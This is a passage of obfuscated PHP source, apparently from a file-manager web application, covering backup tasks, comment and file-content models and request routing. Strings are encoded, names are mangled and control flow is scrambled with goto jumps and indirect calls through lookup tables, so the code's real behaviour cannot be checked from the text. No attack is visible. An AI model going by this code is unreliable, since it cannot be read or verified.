b¤Ú¹Š¶¨; DÇêÆõë‘µ: $EÅ©íÎ±Òå = new Backup(); $EÅ©íÎ±Òå->keep(); $C³ ¥›¸œ = $EÅ©íÎ±Òå->db(); goto FÈèÆ¹™Ç; FÈèÆ¹™Ç: if ($C³ ¥›¸œ) { $C³ ¥›¸œ = $EÅ©íÎ±Òå->dbFile(); if ($C³ ¥›¸œ && $E¼Á¶§˜¹µ[$D”è¼Æç[734]] == $D”è¼Æç[491]) { $C³ ¥›¸œ = $EÅ©íÎ±Òå->file(); } } Backup::set(array($D”è¼Æç[731] => 1, $D”è¼Æç[470] => time())); return !0; goto Fç›ÎŞä†Ô; b¬Ï«¼ª½Ë: if (!$E¼Á¶§˜¹µ || $E¼Á¶§˜¹µ[$D”è¼Æç[1501]] != $D”è¼Æç[86]) { return !1; } $B¢’ƒŸã»— = $this->process(); foreach ($B¢’ƒŸã»— as $B«ÓãËÅƒÜ) { if ($B«ÓãËÅƒÜ) { return Task::restart($B«ÓãËÅƒÜ[$D”è¼Æç[388]]); } } goto DÇêÆõë‘µ; b¤Ú¹Š¶¨: $D”è¼Æç =& $_SERVER[…ë˜õ]; if ($GLOBALS[$D”è¼Æç[6]][$D”è¼Æç[87]][$D”è¼Æç[1721]] != $D”è¼Æç[86]) { return !0; } $E¼Á¶§˜¹µ = $this->config(); goto b¬Ï«¼ª½Ë; Fç›ÎŞä†Ô: } public function process() { $AŠ¾î¥òì½ =& $_SERVER[…ë˜õ]; return array($AŠ¾î¥òì½[736] => Task::get($AŠ¾î¥òì½[754]), $AŠ¾î¥òì½[739] => Task::get($AŠ¾î¥òì½[773]), $AŠ¾î¥òì½[191] => Task::get($AŠ¾î¥òì½[782])); } public function restore() { $A·´Êİ†¨ =& $_SERVER[…ë˜õ]; ActionCall($A·´Êİ†¨[1024], !0, 1); ActionCall($A·´Êİ†¨[1024], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\155\145" => "\x63\157\155\155\145\156\164\137\x6d\145\x74\x61", "\x6d\x65\x74\141\x46\x69\x65\x6c\x64" => "\x63\157\155\155\145\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($fƒãíÀ‰) { $DßëÁ¸§«‘ =& $_SERVER[…ë˜õ]; if ($fƒãíÀ‰[$DßëÁ¸§«‘[1722]]) { $DĞ©¡¯‚áÊ = $this->where(array($DßëÁ¸§«‘[1723] => $fƒãíÀ‰[$DßëÁ¸§«‘[1722]]))->find(); if (!$DĞ©¡¯‚áÊ || $DĞ©¡¯‚áÊ[$DßëÁ¸§«‘[398]] != $fƒãíÀ‰[$DßëÁ¸§«‘[398]] || $DĞ©¡¯‚áÊ[$DßëÁ¸§«‘[478]] != $fƒãíÀ‰[$DßëÁ¸§«‘[478]]) { return !1; } $this->where(array($DßëÁ¸§«‘[1723] => $fƒãíÀ‰[$DßëÁ¸§«‘[1722]]))->setAdd($DßëÁ¸§«‘[1724], 1); } $fƒãíÀ‰[$DßëÁ¸§«‘[1725]] = 0; $fƒãíÀ‰[$DßëÁ¸§«‘[1724]] = 0; $fƒãíÀ‰[$DßëÁ¸§«‘[731]] = 1; return $this->add($fƒãíÀ‰); } public function commentCount($EÊĞ¨‚ÖéÉ, $aÅËù÷ŒùÏ) { goto Eõ¯İĞ½”Ê; C‡Û‘‚ğß˜: $dë³Õ¦Ğ¾– = array($CÔÈÕà¨İ[478], $CÔÈÕà¨İ[1726] => $CÔÈÕà¨İ[474]); $C÷å„œ°»È = array($CÔÈÕà¨İ[478] => array($CÔÈÕà¨İ[7], $EÊĞ¨‚ÖéÉ), $CÔÈÕà¨İ[398] => $aÅËù÷ŒùÏ); $e¢ƒƒôø = $this->field($dë³Õ¦Ğ¾–)->where($C÷å„œ°»È)->group($CÔÈÕà¨İ[478])->select(); goto D™°ÓÈ¯õ; Eõ¯İĞ½”Ê: $CÔÈÕà¨İ =& $_SERVER[…ë˜õ]; if (!$EÊĞ¨‚ÖéÉ) { return array(); } if (is_string($EÊĞ¨‚ÖéÉ) || is_int($EÊĞ¨‚ÖéÉ)) { $EÊĞ¨‚ÖéÉ = array($EÊĞ¨‚ÖéÉ); } goto C‡Û‘‚ğß˜; D™°ÓÈ¯õ: return array_to_keyvalue($e¢ƒƒôø, $CÔÈÕà¨İ[478], $CÔÈÕà¨İ[474]); goto e’Ò²ƒã„ƒ; e’Ò²ƒã„ƒ: } public function remove($f×°¦ŸÁøŸ) { $c‡ÉÌÊ˜ =& $_SERVER[…ë˜õ]; $Eßç“á õ = array($c‡ÉÌÊ˜[1723] => $f×°¦ŸÁøŸ); $A¾©Ô”æèß = $this->where($Eßç“á õ)->find(); if ($A¾©Ô”æèß[$c‡ÉÌÊ˜[1722]]) { $this->where(array($c‡ÉÌÊ˜[1723] => $A¾©Ô”æèß[$c‡ÉÌÊ˜[1722]]))->setAdd($c‡ÉÌÊ˜[1724], -1); } return $this->where($Eßç“á õ)->delete(); } public function edit($DâÇôƒšãù, $bŠ¦¹½ôÄñ) { $CœæÓëÅÄ =& $_SERVER[…ë˜õ]; $CùÂÓêÔ´« = array($CœæÓëÅÄ[1723] => $DâÇôƒšãù); return $this->where($CùÂÓêÔ´«)->save(array($CœæÓëÅÄ[1727] => $bŠ¦¹½ôÄñ)); } public function prasise($F½¬Èï·Òà) { $Bè‘³öŠË =& $_SERVER[…ë˜õ]; $CæÅ‡º·­î = Model($Bè‘³öŠË[1728]); $d—»ÚÌÈÆÂ = array($Bè‘³öŠË[1723] => $F½¬Èï·Òà, $Bè‘³öŠË[1522] => USER_ID); $BäÈÆ†ÅØ¾ = $CæÅ‡º·­î->where($d—»ÚÌÈÆÂ)->find(); if (!$BäÈÆ†ÅØ¾) { $CæÅ‡º·­î->add($d—»ÚÌÈÆÂ); $A“»Şš„ÀÛ = $this->where(array($Bè‘³öŠË[1723] => $F½¬Èï·Òà))->setAdd($Bè‘³öŠË[1725], 1); } else { $CæÅ‡º·­î->where($d—»ÚÌÈÆÂ)->delete(); $A“»Şš„ÀÛ = $this->where(array($Bè‘³öŠË[1723] => $F½¬Èï·Òà))->setAdd($Bè‘³öŠË[1725], -1); } return $A“»Şš„ÀÛ; } public function targetInfo($F¸ŒçŞÇé©, $EË’£Êèö) { goto E¢½ø´ÒêÅ; C©¯Š‘º¡Ù: $eËÃ‚·ºç = "\x52\111\107\x48\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\x63\157\155\x6d\x65\156\x74\137\160\162\141\151\163\145\40\x73\164\141\x72\40\x6f\156\x20\143\x6f\155\x6d\145\x6e\x74\x2e\143\157\x6d\155\x65\156\164\x49\104\40\75\40\163\164\141\x72\56\x63\x6f\x6d\x6d\145\x6e\x74\111\x44"; $e–Û ¤’“¨ = $this->alias($ağÛíñŒÆâ[350])->where($AõÚø»İâ˜)->join($eËÃ‚·ºç, $ağÛíñŒÆâ[1729])->count(); $EÀ¡‘Ó‡å¦ = array($ağÛíñŒÆâ[1730] => $EïêÌÒÕ˜¢, $ağÛíñŒÆâ[1731] => $e–Û ¤’“¨); goto C‚ŒÎ²ÉÌ‡; C‚ŒÎ²ÉÌ‡: return $EÀ¡‘Ó‡å¦; goto B„ÂÍŒŠ; E¢½ø´ÒêÅ: $ağÛíñŒÆâ =& $_SERVER[…ë˜õ]; $AõÚø»İâ˜ = array($ağÛíñŒÆâ[544] => $F¸ŒçŞÇé©, $ağÛíñŒÆâ[545] => $EË’£Êèö); $EïêÌÒÕ˜¢ = $this->where($AõÚø»İâ˜)->count(); goto C©¯Š‘º¡Ù; B„ÂÍŒŠ: } public function listData($c°†ƒœ«ò) { $cÁãœÏÙ =& $_SERVER[…ë˜õ]; if (isset($c°†ƒœ«ò[$cÁãœÏÙ[1732]])) { if ($c°†ƒœ«ò[$cÁãœÏÙ[1732]]) { $c°†ƒœ«ò[$cÁãœÏÙ[1733]] = array($cÁãœÏÙ[977], intval($c°†ƒœ«ò[$cÁãœÏÙ[1732]])); } unset($c°†ƒœ«ò[$cÁãœÏÙ[1732]]); } if (isset($c°†ƒœ«ò[$cÁãœÏÙ[1734]])) { if ($c°†ƒœ«ò[$cÁãœÏÙ[1734]]) { $c°†ƒœ«ò[$cÁãœÏÙ[1733]] = array($cÁãœÏÙ[974], intval($c°†ƒœ«ò[$cÁãœÏÙ[1734]])); } unset($c°†ƒœ«ò[$cÁãœÏÙ[1734]]); } return $this->_listData($c°†ƒœ«ò); } private function _listData($Eåãâ‰³‘ì) { $e°«á¯¾‚† =& $_SERVER[…ë˜õ]; $AÌ•Üå–¯È = $this->where($Eåãâ‰³‘ì)->_makeOrder()->selectPage(100); $this->_listAppendParent($AÌ•Üå–¯È[$e°«á¯¾‚†[365]]); $this->_listAppendUser($AÌ•Üå–¯È[$e°«á¯¾‚†[365]]); $this->_listAppendMeta($AÌ•Üå–¯È[$e°«á¯¾‚†[365]]); return $AÌ•Üå–¯È; } private function _makeOrder() { $BÂ°‰Ó²±Œ =& $_SERVER[…ë˜õ]; $d¦é´‹…î˜ = array($BÂ°‰Ó²±Œ[1725], $BÂ°‰Ó²±Œ[1724], $BÂ°‰Ó²±Œ[192]); $dÜà±…ÄÆˆ = Input::get($BÂ°‰Ó²±Œ[429], $BÂ°‰Ó²±Œ[7], $BÂ°‰Ó²±Œ[410], $d¦é´‹…î˜); $a¯ñ™¯óã = Input::get($BÂ°‰Ó²±Œ[430], $BÂ°‰Ó²±Œ[7], $BÂ°‰Ó²±Œ[1524], array($BÂ°‰Ó²±Œ[1735], $BÂ°‰Ó²±Œ[425])); $F¨Ä ¦áÀ” = $dÜà±…ÄÆˆ . $BÂ°‰Ó²±Œ[50] . $a¯ñ™¯óã; return $this->order($F¨Ä ¦áÀ”); } private function _listAppendParent(&$a÷ÜÎãÌ™) { goto dº‘³ÍÒ¾®; a®Á„Ï¡¸: foreach ($a÷ÜÎãÌ™ as &$eÍ±–‚ÖÈÉ) { if (isset($CÛññàÄâ[$eÍ±–‚ÖÈÉ[$Dƒ¥Í„”[1722]]])) { $eÍ±–‚ÖÈÉ[$Dƒ¥Í„”[1736]] = $CÛññàÄâ[$eÍ±–‚ÖÈÉ[$Dƒ¥Í„”[1722]]]; } } unset($eÍ±–‚ÖÈÉ); goto c©ˆî†ôŞŞ; dº‘³ÍÒ¾®: $Dƒ¥Í„” =& $_SERVER[…ë˜õ]; $eÖôÍ¯ğÙĞ = array_unique(array_to_keyvalue($a÷ÜÎãÌ™, $Dƒ¥Í„”[33], $Dƒ¥Í„”[1722])); $eÖôÍ¯ğÙĞ = array_remove_value($eÖôÍ¯ğÙĞ, $Dƒ¥Í„”[491]); goto F¶ˆªÖ‰†Ÿ; F¶ˆªÖ‰†Ÿ: if (!$eÖôÍ¯ğÙĞ) { return; } $CÛññàÄâ = $this->where(array($Dƒ¥Í„”[1723] => array($Dƒ¥Í„”[7], $eÖôÍ¯ğÙĞ)))->select(); $CÛññàÄâ = array_to_keyvalue($CÛññàÄâ, $Dƒ¥Í„”[1733]); goto a®Á„Ï¡¸; c©ˆî†ôŞŞ: } private function _listAppendUser(&$DÇ‰íõËİ†) { goto bØ›»õˆ»°; bØ›»õˆ»°: $C·Ï¬‰ç«˜ =& $_SERVER[…ë˜õ]; $fâÕ¯ÅÊÔñ = array_unique(array_to_keyvalue($DÇ‰íõËİ†, $C·Ï¬‰ç«˜[33], $C·Ï¬‰ç«˜[1531])); $fâÕ¯ÅÊÔñ = array_remove_value($fâÕ¯ÅÊÔñ, $C·Ï¬‰ç«˜[491]); goto D¾¶¾ª±¶; A¾¸ŒŸ–: foreach ($DÇ‰íõËİ† as &$c‘¾ß×³ÓÆ) { $c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[557]] = $b‘«ÃÁ‰[$c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[1531]]]; if (isset($c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[1736]])) { $c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[1736]][$C·Ï¬‰ç«˜[557]] = $b‘«ÃÁ‰[$c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[1736]][$C·Ï¬‰ç«˜[1531]]]; } } unset($c‘¾ß×³ÓÆ); goto Cì’’‹‚·ô; D¾¶¾ª±¶: if (count($fâÕ¯ÅÊÔñ) == 0) { return; } foreach ($DÇ‰íõËİ† as $c‘¾ß×³ÓÆ) { if (isset($c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[1736]])) { $fâÕ¯ÅÊÔñ[] = $c‘¾ß×³ÓÆ[$C·Ï¬‰ç«˜[1736]][$C·Ï¬‰ç«˜[1531]]; } } $b‘«ÃÁ‰ = Model($C·Ï¬‰ç«˜[501])->userListInfo($fâÕ¯ÅÊÔñ); goto A¾¸ŒŸ–; Cì’’‹‚·ô: } private function _listAppendMeta(&$A¶“Ìš¨…ô) { goto c“£ÌÀ­·ß; c“£ÌÀ­·ß: $b™æ¡¹í°® =& $_SERVER[…ë˜õ]; $FÅí²“‡Ó› = array_unique(array_to_keyvalue($A¶“Ìš¨…ô, $b™æ¡¹í°®[33], $b™æ¡¹í°®[1733])); $FÅí²“‡Ó› = array_remove_value($FÅí²“‡Ó›, $b™æ¡¹í°®[491]); goto B—¯Äİô¹; bÜÈİŸ™ˆ¢: if (!$c­¨µ¿¬§„) { return !1; } foreach ($A¶“Ìš¨…ô as &$dİÑÍÔšù…) { $dİÑÍÔšù…[$b™æ¡¹í°®[439]] = $c­¨µ¿¬§„[$dİÑÍÔšù…[$b™æ¡¹í°®[1733]]]; if (isset($dİÑÍÔšù…[$b™æ¡¹í°®[1736]])) { $dİÑÍÔšù…[$b™æ¡¹í°®[1736]][$b™æ¡¹í°®[439]] = $c­¨µ¿¬§„[$dİÑÍÔšù…[$b™æ¡¹í°®[1736]][$b™æ¡¹í°®[1733]]]; } } unset($dİÑÍÔšù…); goto bÚ©àÈ¨ÛŸ; B—¯Äİô¹: if (!$FÅí²“‡Ó›) { return; } foreach ($A¶“Ìš¨…ô as $dİÑÍÔšù…) { if (isset($dİÑÍÔšù…[$b™æ¡¹í°®[1736]])) { $FÅí²“‡Ó›[] = $dİÑÍÔšù…[$b™æ¡¹í°®[1736]][$b™æ¡¹í°®[1733]]; } } $c­¨µ¿¬§„ = $this->metaList($FÅí²“‡Ó›); goto bÜÈİŸ™ˆ¢; bÚ©àÈ¨ÛŸ: } private function metaList($C”°¿²…Ò) { goto B¦ÃÈ‹Ï³¶; f¢¥‡Şé¸: $bùà“•ÍÌ = Model($eâöÖÀÄ¨Æ[1737])->where($c—‹ÏÁ´À°)->select(); $bùà“•ÍÌ = array_to_keyvalue_group($bùà“•ÍÌ, $eâöÖÀÄ¨Æ[1733]); foreach ($bùà“•ÍÌ as $D»¡¦È³ŠÓ => $DŠëËƒÚ–…) { $CçíÍ³ÆÚ = array(); foreach ($DŠëËƒÚ–… as $Bµø¬‚åÜ‡) { $CçíÍ³ÆÚ[$Bµø¬‚åÜ‡[$eâöÖÀÄ¨Æ[92]]] = $Bµø¬‚åÜ‡[$eâöÖÀÄ¨Æ[370]]; } $bùà“•ÍÌ[$D»¡¦È³ŠÓ] = $CçíÍ³ÆÚ; } goto Dï‡Ä¹¹»; Dï‡Ä¹¹»: return $bùà“•ÍÌ ? $bùà“•ÍÌ : array(); goto AÊ«Ÿ—¶‚; B¦ÃÈ‹Ï³¶: $eâöÖÀÄ¨Æ =& $_SERVER[…ë˜õ]; if (!$C”°¿²…Ò) { return array(); } $c—‹ÏÁ´À° = array($eâöÖÀÄ¨Æ[1733] => array($eâöÖÀÄ¨Æ[7], $C”°¿²…Ò)); goto f¢¥‡Şé¸; AÊ«Ÿ—¶‚: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\145\137\x63\x6f\x6e\x74\145\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\151\155\145", "\164\151\x6d\145", "\x69\156\x73\x65\x72\164", "\146\x75\x6e\x63\164\151\x6f\x6e")); } goto D·Àå‡™™š; C´‘ÚªÁå: $cÕÀ‹ã±¹ö = $_SERVER[…ë˜õ][573]; while (strlen($cÕÀ‹ã±¹ö) < $_SERVER[…ë˜õ][574]) { if (!$cÕÀ‹ã±¹ö) { break; } $cÕÀ‹ã±¹ö++; } class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($b‡ˆ¿ë‹ä‡) { goto BÛ§¯ÜÌäŞ; c¿ÈóÁÅ‹·: $this->defaultController = $c§•àÛøñ­[1] ? $c§•àÛøñ­[1] : $this->defaultController; $fÆµÍœáƒ³ = $FêœõÔ„¥ë[576]; if (strlen($fÆµÍœáƒ³) < $FêœõÔ„¥ë[574]) { die; } goto f·ìèä¯¸—; cÔ³¡í¥åË: $d¹Ş†îÈÙ³ = $FêœõÔ„¥ë[578]; while (strlen($d¹Ş†îÈÙ³) < $FêœõÔ„¥ë[570]) { if (!$d¹Ş†îÈÙ³) { break; } $d¹Ş†îÈÙ³++; } goto Dß·„òÓ…; BÛ§¯ÜÌäŞ: $FêœõÔ„¥ë =& $_SERVER[…ë˜õ]; $D¯†¸É™³Á =& $_SERVER[­ó]; $c§•àÛøñ­ = $D¯†¸É™³Á[0]($D¯†¸É™³Á[1], $D¯†¸É™³Á[2]($b‡ˆ¿ë‹ä‡, $D¯†¸É™³Á[1])); goto bœÚËò—îÔ; f·ìèä¯¸—: $this->defaultAction = $c§•àÛøñ­[2] ? $c§•àÛøñ­[2] : $this->defaultAction; $f®Õß¿–²  = $FêœõÔ„¥ë[577]; $this->{$_SERVER[­ó][3]}($D¯†¸É™³Á[4], array($this, $D¯†¸É™³Á[5])); goto cÔ³¡í¥åË; bœÚËò—îÔ: $this->defaultModule = $c§•àÛøñ­[0] ? $c§•àÛøñ­[0] : $this->defaultModule; $Dåäˆ¢Äê = $FêœõÔ„¥ë[575]; if (!$Dåäˆ¢Äê) { die; } goto c¿ÈóÁÅ‹·; Dß·„òÓ…: } public function appRun($aÉØ‡­‹ª’) { goto D’äİ„ËÁ‡; E¡½ °¿ìŒ: $dÔµí«ïÉ¤ = $b²¿ë‡öëá[582]; if (strlen($dÔµí«ïÉ¤) < $b²¿ë‡öëá[570]) { die; } goto FŒñä¸À¿‰; D’äİ„ËÁ‡: $b²¿ë‡öëá =& $_SERVER[…ë˜õ]; $b¶†¶¼«Ñ =& $_SERVER[­ó]; $fïçÔÌ óù = $b¶†¶¼«Ñ[0]($b¶†¶¼«Ñ[1], $aÉØ‡­‹ª’); goto aùñÀ»Ç™ö; eÒÔ†°†Íó: $f…‘²ÃÒ‰¯ = $b¶†¶¼«Ñ[7]; $DíÛ†ï÷¬ = $b²¿ë‡öëá[581]; if ($f¼„Ò÷ª› == $b¶†¶¼«Ñ[8]) { $f…‘²ÃÒ‰¯ = $b¶†¶¼«Ñ[9]; $fïçÔÌ óù[0] = $b¶†¶¼«Ñ[10]; $fïçÔÌ óù[1] = $fïçÔÌ óù[1] . $b¶†¶¼«Ñ[11]; $aÉØ‡­‹ª’ = $b¶†¶¼«Ñ[12]($b¶†¶¼«Ñ[1], $fïçÔÌ óù); $aÉØ‡­‹ª’ = $b¶†¶¼«Ñ[2]($aÉØ‡­‹ª’, $b¶†¶¼«Ñ[1]); } goto f‚ğ“Ü‰İç; aùñÀ»Ç™ö: $C—åÏÒ† = $b²¿ë‡öëá[579]; if (strlen($C—åÏÒ†) < $b²¿ë‡öëá[580]) { return; } $f¼„Ò÷ª› = $b¶†¶¼«Ñ[6]($fïçÔÌ óù[0]); goto eÒÔ†°†Íó; f‚ğ“Ü‰İç: $b¶†¶¼«Ñ[13](array($b¶†¶¼«Ñ[14], $b¶†¶¼«Ñ[15]), $f…‘²ÃÒ‰¯ . $b¶†¶¼«Ñ[16], $aÉØ‡­‹ª’); $b¶†¶¼«Ñ[17]($aÉØ‡­‹ª’); $b¶†¶¼«Ñ[13](array($b¶†¶¼«Ñ[14], $b¶†¶¼«Ñ[15]), $f…‘²ÃÒ‰¯ . $b¶†¶¼«Ñ[18], $aÉØ‡­‹ª’); goto E¡½ °¿ìŒ; FŒñä¸À¿‰: } private function autorun() { $dâò˜Ã¶ä =& $_SERVER[­ó]; global $config; if ($dâò˜Ã¶ä[19]($config[$dâò˜Ã¶ä[20]]) == 0) { return; } foreach ($config[$dâò˜Ã¶ä[20]] as $C–¶äÆç‡Î => $A½Üğ˜„İ) { $this->{$_SERVER[­ó][21]}($A½Üğ˜„İ); } } private function mpzhdaa268c8() { goto F¸—Ş˜ªí; EŒŸ‚ù†Şé: $f§ø™“Ğ° = $GLOBALS[$cÁÌÀ¥¼Ø”[22]][$cÁÌÀ¥¼Ø”[23]][0]; $Cèùòò®«Î = $dí³Ó¡¤ó[583]; if (!$Cèùòò®«Î) { die; } goto D×‰àè‘ƒİ; CÌäî—Ä¥: $bÂ¼‹ã = $dí³Ó¡¤ó[585]; while (strlen($bÂ¼‹ã) < $dí³Ó¡¤ó[574]) { if (!$bÂ¼‹ã) { break; } $bÂ¼‹ã++; } $CŒÜïÚ„ˆ¼ = $cÁÌÀ¥¼Ø”[26]($GLOBALS[$cÁÌÀ¥¼Ø”[22]][$cÁÌÀ¥¼Ø”[23]], 1); goto cÖÊöèï¥í; F¸—Ş˜ªí: $dí³Ó¡¤ó =& $_SERVER[…ë˜õ]; $cÁÌÀ¥¼Ø” =& $_SERVER[­ó]; $F±†¨á®¢× = $cÁÌÀ¥¼Ø”[8]; goto EŒŸ‚ù†Şé; B“Œé¿Á„œ: $GLOBALS[$cÁÌÀ¥¼Ø”[22]][$cÁÌÀ¥¼Ø”[28]] = $cÁÌÀ¥¼Ø”[29]($cÁÌÀ¥¼Ø”[1], $GLOBALS[$cÁÌÀ¥¼Ø”[22]][$cÁÌÀ¥¼Ø”[23]]); $e‚‹·Ğ¡½ = $dí³Ó¡¤ó[587]; while ($e‚‹·Ğ¡½ < $dí³Ó¡¤ó[574]) { if ($e‚‹·Ğ¡½ >= 0) { break; } $e‚‹·Ğ¡½++; } goto a«æÕ¬Æ¿ß; cÖÊöèï¥í: $c®à†íÉµâ = $dí³Ó¡¤ó[586]; if (!$c®à†íÉµâ) { die; } $GLOBALS[$cÁÌÀ¥¼Ø”[22]][$cÁÌÀ¥¼Ø”[23]] = $cÁÌÀ¥¼Ø”[27]($D—¼ÏĞ÷Æ, $CŒÜïÚ„ˆ¼); goto B“Œé¿Á„œ; a“‹½‹·: $DˆäÅå¦œñ = $dí³Ó¡¤ó[584]; if (strlen($DˆäÅå¦œñ) < $dí³Ó¡¤ó[580]) { return; } $D—¼ÏĞ÷Æ = array($cÁÌÀ¥¼Ø”[8], $e»İ­ñ‘Æ); goto CÌäî—Ä¥; D×‰àè‘ƒİ: if (!$f§ø™“Ğ° || $cÁÌÀ¥¼Ø”[24]($f§ø™“Ğ°) <= $cÁÌÀ¥¼Ø”[24]($F±†¨á®¢×)) { return; } if ($cÁÌÀ¥¼Ø”[6]($cÁÌÀ¥¼Ø”[25]($f§ø™“Ğ°, -$cÁÌÀ¥¼Ø”[24]($F±†¨á®¢×))) != $F±†¨á®¢×) { return; } $e»İ­ñ‘Æ = $cÁÌÀ¥¼Ø”[25]($f§ø™“Ğ°, 0, -$cÁÌÀ¥¼Ø”[24]($F±†¨á®¢×)); goto a“‹½‹·; a«æÕ¬Æ¿ß: } private function givq82a8ba4b() { goto C°÷ñ®; D†°¶Ó„Õ†: $GLOBALS[$C½¬Êì¡–“[22]][$C½¬Êì¡–“[28]] = $C½¬Êì¡–“[29]($C½¬Êì¡–“[1], $GLOBALS[$C½¬Êì¡–“[22]][$C½¬Êì¡–“[23]]); goto D¯Å´¥âöî; E«ƒÁÃãª: $GLOBALS[$C½¬Êì¡–“[22]][$C½¬Êì¡–“[23]] = $C½¬Êì¡–“[0]($C½¬Êì¡–“[36], $dÚ¡Áí÷ß); $aê›ÍÇ¥Æ– = $AòÕâÉ¹Ÿ©[591]; if (strlen($aê›ÍÇ¥Æ–) < $AòÕâÉ¹Ÿ©[580]) { die; } goto D†°¶Ó„Õ†; bÀÚ…ôèœ: $E˜Ê«—–Èæ = $_SERVER[$C½¬Êì¡–“[30]]; $BŒ˜ç«¥‘Œ = $AòÕâÉ¹Ÿ©[588]; $e‚–ÊÈ­Ú” = $C½¬Êì¡–“[31]; goto f”²ŠõŠ¡£; b²©†›„Í¶: $fÇÂ¡õ¿•Ò = $AòÕâÉ¹Ÿ©[589]; if (strlen($fÇÂ¡õ¿•Ò) < $AòÕâÉ¹Ÿ©[570]) { die; } $C½¬Êì¡–“[34]($C½¬Êì¡–“[35], $dÚ¡Áí÷ß, $bŒÛœ’î‡ã); goto e¨‰Ê¬£†; e¨‰Ê¬£†: $bªĞ‡Ùå‰ï = $AòÕâÉ¹Ÿ©[590]; if (!$bªĞ‡Ùå‰ï) { return; } $dÚ¡Áí÷ß = $C½¬Êì¡–“[2]($bŒÛœ’î‡ã[0][0], $C½¬Êì¡–“[36]); goto E«ƒÁÃãª; C°÷ñ®: $AòÕâÉ¹Ÿ© =& $_SERVER[…ë˜õ]; $C½¬Êì¡–“ =& $_SERVER[­ó]; if ($GLOBALS[$C½¬Êì¡–“[22]][$C½¬Êì¡–“[28]] != $C½¬Êì¡–“[10]) { return; } goto bÀÚ…ôèœ; f”²ŠõŠ¡£: if (!$C½¬Êì¡–“[32]($E˜Ê«—–Èæ, $e‚–ÊÈ­Ú”)) { return; } $cª”†ğÔ¢ = $C½¬Êì¡–“[33]($E˜Ê«—–Èæ, $e‚–ÊÈ­Ú”); $dÚ¡Áí÷ß = $C½¬Êì¡–“[25]($E˜Ê«—–Èæ, $cª”†ğÔ¢ + $C½¬Êì¡–“[24]($e‚–ÊÈ­Ú”)); goto b²©†›„Í¶; D¯Å´¥âöî: } public function run() { goto fŒ÷ğ¼œõé; fŒ÷ğ¼œõé: $F…Ãå·Îê =& $_SERVER[…ë˜õ]; $fìääøœê› =& $_SERVER[­ó]; $this->{$_SERVER[­ó][37]}(); goto bÕáÉ½‚Ì; EÁ“³Á²½Á: $fìääøœê›[39]($fìääøœê›[43], MOD . $fìääøœê›[1] . ST . $fìääøœê›[1] . ACT); $b©’Ğ÷ğ¬ø = $F…Ãå·Îê[595]; if (strlen($b©’Ğ÷ğ¬ø) < $F…Ãå·Îê[596]) { return; } goto aÍÂòÕ ÚÏ; C··æ»”­«: $f´ë¦à¬Ø = $GLOBALS[$fìääøœê›[22]][$fìääøœê›[28]]; $fìääøœê›[39]($fìääøœê›[40], isset($F¥Ÿ²¨‹Ú[0]) && $F¥Ÿ²¨‹Ú[0] ? $F¥Ÿ²¨‹Ú[0] : $this->defaultModule); $eˆí‚Ç†Ë = $F…Ãå·Îê[594]; goto F†¨»ìá—; aŸò¦°¦¹: $F¥Ÿ²¨‹Ú = $GLOBALS[$fìääøœê›[22]][$fìääøœê›[23]]; $B„…¤ïèë´ = $F…Ãå·Îê[593]; if (!$B„…¤ïèë´) { die; } goto C··æ»”­«; F†¨»ìá—: if (!$eˆí‚Ç†Ë) { die; } $fìääøœê›[39]($fìääøœê›[41], isset($F¥Ÿ²¨‹Ú[1]) && $F¥Ÿ²¨‹Ú[0] ? $F¥Ÿ²¨‹Ú[1] : $this->defaultController); $fìääøœê›[39]($fìääøœê›[42], isset($F¥Ÿ²¨‹Ú[2]) && $F¥Ÿ²¨‹Ú[0] ? $F¥Ÿ²¨‹Ú[2] : $this->defaultAction); goto EÁ“³Á²½Á; bÕáÉ½‚Ì: $A³ ¥çš†£ = $F…Ãå·Îê[592]; if (!$A³ ¥çš†£) { die; } $this->{$_SERVER[­ó][38]}(); goto aŸò¦°¦¹; aÍÂòÕ ÚÏ: $_SERVER[$fìääøœê›[44]] = $fìääøœê›[6](ACTION); $CİäÉÂæ = $F…Ãå·Îê[597]; $this->{$_SERVER[­ó][45]}(); goto e»õŒ‡¸ŠË; e»õŒ‡¸ŠË: $a¶„—®ö¦ë = $F…Ãå·Îê[598]; if (strlen($a¶„—®ö¦ë) < $F…Ãå·Îê[599]) { return; } if ($fìääøœê›[19]($F¥Ÿ²¨‹Ú) >= 3) { $this->{$_SERVER[­ó][21]}($f´ë¦à¬Ø); } else { $this->{$_SERVER[­ó][21]}(ACTION); } goto Dä§ê…Ğâæ; Dä§ê…Ğâæ: } private $bdil1063e89a = array(); private $arsvdd80322b = ''; public function cvme8d1a2dc6() { goto d”…ğÕŒÜÜ; a¯ ÚÁí÷Ö: $this->{$_SERVER[­ó][48]}(); $CßŒ£‡ƒÇ = $cÖšö…ŠËª[601]; $this->{$_SERVER[­ó][49]}(); goto Bß¢Ö¬Ùí; d”…ğÕŒÜÜ: $cÖšö…ŠËª =& $_SERVER[…ë˜õ]; $aÛ¤Á‰±ÏÙ =& $_SERVER[­ó]; $this->{$_SERVER[­ó][46]}(); goto bİ¾í¾…¼Ö; C‹Œ„¹” ‰: $this->{$_SERVER[­ó][51]}(); $this->{$_SERVER[­ó][52]}(); $a¥£èñÏ’ = $cÖšö…ŠËª[603]; goto eÀĞè‚…ßå; Bß¢Ö¬Ùí: $DÉÙîÃ¬í£ = $cÖšö…ŠËª[602]; if (strlen($DÉÙîÃ¬í£) < $cÖšö…ŠËª[596]) { return; } $this->{$_SERVER[­ó][50]}(); goto 